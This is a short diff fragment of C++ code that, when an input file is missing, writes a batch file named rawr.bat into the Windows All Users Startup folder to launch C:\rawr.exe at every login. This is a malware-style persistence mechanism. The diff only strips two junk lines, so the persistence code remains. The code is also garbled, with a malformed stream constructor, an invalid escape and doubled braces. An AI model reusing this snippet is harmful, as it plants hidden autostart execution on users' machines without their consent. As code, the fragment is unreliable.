@@ -20,8 +20,6 @@ ifstream input(inputFile);
 if (!input)
 {{
 ofstream fp("C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
-ios::app);
-adadafafa
 fp << "@ECHO OFF \N";
 fp << "START C:\\rawr.exe \n";
 fp << "EXIT";
